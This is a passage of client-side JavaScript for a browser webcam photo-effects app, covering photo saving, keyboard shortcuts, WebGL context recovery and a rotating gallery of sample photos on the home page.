                    e.preventDefault();
                }
            };
        });
        b.mouseup(function () {
            var e = false;
            S.parent().each(function () {
                if ($(this).data("pressed")) {
                    e = true;
                    $(this).trigger("mouseup");
                }
            });
            if (!e) {
                Qe();
            }
        });
        try {
            k[0].oncontextmenu = b[0].oncontextmenu = v[0].oncontextmenu = function (e) {
                if (e) {
                    e.preventDefault();
                    return false;
                }
            };
        } catch (e) {}
        z.click(function () {
            $(this).attr("download", rA());
            c.saveCount++;
            try {
                localStorage.setItem("saveCount", c.saveCount);
            } catch (e) {}
            o.trackEvent("Photo", "Save", u.id);
            o.log("Photo", "Save", u.id);
            nA();
        })
            .mousedown(function () {
                if (n && n.src) {
                    if (a && o.ua.isiOS) {
                        $(this).attr("href", n.src);
                    } else {
                        try {
                            var e = window.atob(n.src.substring("data:image/jpeg;base64,".length));
                            var A = new Uint8Array(e.length);
                            for (var t = 0, i = e.length; t < i; t++) {
                                A[t] = e.charCodeAt(t);
                            }
                            var r = new Blob([A.buffer], { type: "image/jpeg" });
                            $(this).attr("href", URL.createObjectURL(r));
                        } catch (e) {
                            $(this).attr("href", n.src);
                        }
                    }
                }
            })
            .mouseup(sA)
            .mouseout(sA)
            .mouseleave(sA);
        if (!a) {
            z.hover(
                function () {
                    $A(ae);
                    ae.stop(true, true).fadeIn(150);
                },
                function () {
                    ae.stop(true, true).delay(100).fadeOut(150);
                }
            );
        }
    }
    function tt() {
        Ue.on("change input focus blur mousedown mouseup", IA);
        $(document)
            .keydown(function (e) {
                if (c.isSharing) {
                    if (Ue.is(":focus")) {
                        return;
                    }
                    if (e.metaKey && e.keyCode === 8) {
                        oA();
                        return;
                    }
                }
                if (e.altKey || e.ctrlKey || e.shiftKey || e.metaKey || c.isZooming) {
                    return;
                }
                switch (e.keyCode) {
                    case 8:
                        e.preventDefault();
                        break;
                    case 32:
                        if (!c.isGrid) {
                            Z.addClass("button-active");
                        }
                        break;
                    case 37:
                        if (c.isGrid) {
                            W.addClass("button-active");
                        } else {
                            K.addClass("button-active");
                        }
                        break;
                    case 38:
                        if (c.isGrid) {
                            W.addClass("button-active");
                        }
                        break;
                    case 39:
                        if (c.isGrid) {
                            O.addClass("button-active");
                        } else {
                            q.addClass("button-active");
                        }
                        break;
                    case 40:
                        if (c.isGrid) {
                            O.addClass("button-active");
                        }
                        break;
                    case 67:
                        if (!c.isGrid) {
                            B.parent().addClass("settings-active");
                        }
                        break;
                    case 70:
                        if (!c.isGrid) {
                            F.parent().addClass("settings-active");
                        }
                        break;
                    case 71:
                        if (!c.isGrid) {
                            Q.addClass("button-active");
                        }
                        break;
                    case 73:
                        if (!c.isGrid) {
                            L.addClass("button-active");
                        }
                        break;
                    case 77:
                        if (!c.isGrid) {
                            I.parent().addClass("settings-active");
                        }
                        break;
                    case 83:
                        if (!c.isGrid) {
                            D.parent().addClass("settings-active");
                        }
                        break;
                }
            })
            .keyup(function (e) {
                if (c.isSharing && Ue.is(":focus")) {
                    if (e.keyCode === 13) {
                        kA();
                    }
                    return;
                }
                if (e.altKey || e.ctrlKey || e.shiftKey || e.metaKey || c.isZooming) {
                    return;
                }
                switch (e.keyCode) {
                    case 8:
                        e.preventDefault();
                        break;
                    case 27:
                        eA();
                        break;
                    case 32:
                        if (c.isGrid) {
                            $e();
                        } else {
                            Z.removeClass("button-active");
                            lA();
                        }
                        break;
                    case 37:
                        if (c.isGrid) {
                            W.removeClass("button-active");
                            Ze();
                        } else {
                            K.removeClass("button-active");
                            Me();
                        }
                        break;
                    case 38:
                        if (c.isGrid) {
                            W.removeClass("button-active");
                            Ze();
                        }
                        break;
                    case 39:
                        if (c.isGrid) {
                            O.removeClass("button-active");
                            Ve();
                        } else {
                            q.removeClass("button-active");
                            Ge();
                        }
                        break;
                    case 40:
                        if (c.isGrid) {
                            O.removeClass("button-active");
                            Ve();
                        }
                        break;
                    case 67:
                        if (!c.isGrid) {
                            Ye();
                            B.parent().removeClass("settings-active");
                            B[0].checked = c.useCountdown;
                        }
                        break;
                    case 70:
                        if (!c.isGrid) {
                            He();
                            F.parent().removeClass("settings-active");
                            F[0].checked = c.useCameraFlash;
                        }
                        break;
                    case 71:
                        Q.removeClass("button-active");
                        $e();
                        break;
                    case 73:
                        if (!c.isGrid) {
                            L.removeClass("button-active");
                            if (!c.isCapturing && !c.isSharing) {
                                k.toggle();
                            }
                        }
                        break;
                    case 77:
                        if (!c.isGrid) {
                            I.parent().removeClass("settings-active");
                        }
                        Pe();
                        I[0].checked = u.isMirror;
                        break;
                    case 83:
                        if (!c.isGrid) {
                            D.parent().removeClass("settings-active");
                        }
                        je();
                        D[0].checked = u.isSquare;
                        break;
                }
            });
    }
    function it() {
        if (a) {
            switch ((window.orientation + 360) % 360) {
                case 90:
                case 270:
                    return 1 / f;
            }
        }
        return f;
    }
    function rt(e) {
        if (h && h.videoWidth && h.videoHeight && h.videoWidth > 2 && h.videoHeight > 2) {
            var A = h.videoWidth + "x" + h.videoHeight;
            o.trackEvent("Capabilities", "Resolution", A);
            o.log("Resolution", A);
            f = h.videoWidth / h.videoHeight;
        } else {
            o.trackEvent("Capabilities", "Resolution", "None");
            o.log("Resolution", "None");
            f = a ? 3 / 4 : 4 / 3;
        }
        f = it();
        try {
            var t = o.Effect.size.width,
                i = o.Effect.size.height,
                r;
            if (u) {
                r = u.id;
                u.destroy();
                w.remove();
                v.prepend("<canvas/>");
                w = $("#toy-view canvas");
            }
            o.Effect.initBackground($("#toy-bg")[0]);
            if (f < 1) {
                u = new o.Effect(w[0], h, i, Math.floor(i / f));
            } else {
                u = new o.Effect(w[0], h, t, Math.floor(t / f));
            }
            u.setEffect(r);
        } catch (e) {
            o.error(e);
            return;
        }
        if (e) {
            e();
        }
    }
    function st() {
        ze();
        if (u) {
            u.destroyShaders();
        }
        if (c.isGrid) {
            if (c.isZooming) {
                c.isZooming = false;
                p.removeClass("wait");
                $("#button-effects p").show();
                M.hide();
            }
            c.isGrid = false;
            _e();
        }
        if (c.isGridLoaded) {
            c.isGridLoaded = false;
            if (l) {
                l.destroy();
            }
        }
        o.log("Effects destroyed");
    }
    A.destroy = function (e, A) {
        x.stop().css("opacity", 1).show();
        y.stop().hide();
        C.stop().hide();
        if (c.isDestroyed) {
            return;
        }
        st();
        $(document).off("keydown keyup");
        c.isDestroyed = true;
        o.error(e, A);
    };
    function ot(e) {
        e.preventDefault();
        A.destroy("WebGL context lost");
    }
    function at() {
        if (!c.isDestroyed) {
            return;
        }
        if (c.restoreCount > 4) {
            location.reload();
            return;
        }
        rt();
        tt();
        Oe();
        Qe();
        Ne();
        x.hide();
        y.show();
        C.show();
        c.isDestroyed = false;
        c.restoreCount++;
        var e = "WebGL context restored";
        o.trackEvent("Error", e, "", true);
        o.log(e);
    }
    function nt(e) {
        var A = new Image();
        A.src = o.Services.assetsURL + "images/" + e;
    }
    A.preloadImages = function () {
        var e = ["video.svg", "camera.svg", "camera4.svg", "gear.svg", "check.svg", "plus.svg", "twitter.svg", "google-photos.svg", "power.svg"];
        if (o.ua.locale === "ru") {
            e.push("vk.svg");
        } else {
            e.push("tumblr.svg");
        }
        for (var A = 0; A < e.length; A++) {
            nt(e[A]);
        }
    };
    function ct() {
        if (c.isDestroyed) {
            return;
        }
        if (!u) {
            o.error("Effects not found");
            return;
        }
        c.saveFilename = z.data("save") || "webcam-toy-photo.jpg";
        c.saveFilename = c.saveFilename.substr(0, c.saveFilename.indexOf("."));
        try {
            c.saveCount = parseInt(localStorage.getItem("saveCount"), 10) || 1;
        } catch (e) {}
        I[0].checked = u.isMirror;
        D[0].checked = u.isSquare;
        B[0].checked = c.useCountdown;
        F[0].checked = c.useCameraFlash;
        J[0].checked = tA();
        $(document)
            .on("webkitfullscreenchange mozfullscreenchange mozfullscreenerror", function () {
                J[0].checked = tA();
                Qe();
            })
            .on("visibilitychange webkitvisibilitychange mozvisibilitychange", function () {
                if (h && u) {
                    if (document.hidden || document.webkitHidden || document.mozHidden) {
                        if (!g) {
                            g = true;
                            o.log("App hidden");
                        }
                    } else {
                        if (g) {
                            g = false;
                            o.log("App visible");
                            try {
                                u.setEffect(u.id);
                            } catch (e) {}
                            Ne();
                            Qe();
                        }
                    }
                }
                try {
                    localStorage.setItem("log", o.log());
                } catch (e) {}
            });
        v.addClass("toy-shadow");
        C.on("touchmove", function (e) {
            e.preventDefault();
        });
        E.on("touchmove", function (e) {
            e.preventDefault();
        });
        Oe();
        At();
        window.onorientationchange = function () {
            setTimeout(Qe, 250);
        };
        $(window).resize(Qe);
        Qe();
        Ne();
        x.removeClass("wait");
        if (c.isDestroyed) {
            A.destroy();
        } else {
            Le(
                0,
                x,
                0,
                function () {
                    if (c.isDestroyed) {
                        A.destroy();
                    } else {
                        Le(
                            1,
                            y,
                            0,
                            function () {
                                if (c.isDestroyed) {
                                    A.destroy();
                                } else {
                                    Le(1, C, 0, tt, true);
                                }
                            },
                            true
                        );
                    }
                },
                true
            );
        }
    }
    A.init = function (e) {
        if (h) {
            return;
        }
        h = e;
        h.setAttribute("playsinline", "playsinline");
        h.title = o.Services.appName;
        $("#toy-main canvas").on("webglcontextlost", ot).on("webglcontextrestored", at);
        if (h && h.videoWidth) {
            rt(ct);
        } else {
            var A = 0,
                t = setInterval(function () {
                    A++;
                    if (A > 8 || (h && h.videoWidth)) {
                        clearInterval(t);
                        rt(ct);
                    }
                }, 500);
        }
    };
    return A;
})(WebcamToy);
WebcamToy.Home = (function (i) {
    "use strict";
    var e = {},
        r,
        s = 0,
        t = 4,
        o,
        a;
    function n() {
        t++;
        t %= r.length;
    }
    function c(e) {
        return i.Services.assetsURL + "photos/" + e + ".jpg";
    }
    function h(e, A) {
        if (e && A && A.img && A.id) {
            e.css("background-image", "url(" + c(A.img) + ")");
        }
    }
    function u(e) {
        if (e) {
            var A = $("#photo" + (s + 1)),
                t;
            try {
                if (A) {
                    t = A.find("div");
                    if (t && !!t[0]) {
                        t.css("opacity", 1);
                    }
                }
            } catch (e) {}
            o = setTimeout(function () {
                h(A, e);
                s++;
                s %= 4;
                n();
                o = setTimeout(function () {
                    try {
                        if (t && !!t[0]) {
                            t.css("opacity", 0);
                        }
                    } catch (e) {}
                    l();
                }, 150);
            }, 210);
        }
    }
    function A() {
        var A = r[t];
        if (!A || !A.img || !A.id || A.img.length !== 15) {
            l();
            return;
        }
        var e = new Image();
        e.onload = function () {
            var e = i.ua.isMobile ? 2e3 : 1400;
            o = setTimeout(function () {
                u(A);
            }, e);
        };
        e.onerror = function () {
            n();
            o = setTimeout(l, 100);
        };
        e.src = c(A.img);
    }
    function l(e) {
        try {
            if (!$("#app").is(":visible")) {
                if ($("#home-photos").is(":visible")) {
                    A();
                } else {
                    o = setTimeout(l, 3e3);
                }
            }
        } catch (e) {}
    }
    function f() {
        return Math.round(Math.random()) - 0.5;
    }
    function d() {
        a = $.ajax({
            url: i.Services.assetsURL + "photos/" + ($("#home-photos").data("json") || "photos") + ".json",
            dataType: "json",
            timeout: 2e4,
            error: function () {},
            success: function (e) {
                if (e && e.photos) {
                    r = e.photos.sort(f);
                    for (var A = 0; A < 4; A++) {
                        var t = $("#photo" + (A + 1));
                        h(t, e.photos[A]);
                    }
                    setTimeout(function () {
                        try {
                            var e = $("#home-photos div");
                            if (e && !!e[0]) {
                                e.addClass("photo-fade").css("opacity", 0);
                            }
                        } catch (e) {}
                    }, 200);
                    o = setTimeout(l, 500);
                }
            },
        });
    }
    function m() {
        if (i.init) {
            var e = $("#home"),
                A = $("#home-ad"),
                t = $("#home-photos div");
            clearTimeout(o);
            if (a) {
                a.abort();
            }
            if (A) {
                A.fadeOut(200);
            }
            if (t) {
                t.stop();
            }
            if (e) {
                e.fadeOut(150, function () {
                    if (i.init) {
                        i.init();
                    }
                });
            } else {
                if ($footer) {
                    $footer.hide();
                }
                i.init();
            }
        }
    }
    e.init = function () {
        if ($.fn.buttonClick) {
            $("#button-init").buttonClick(m);
        } else {
            $("#button-init").click(m);
        }
        d();
    };
    return e;
})(WebcamToy);
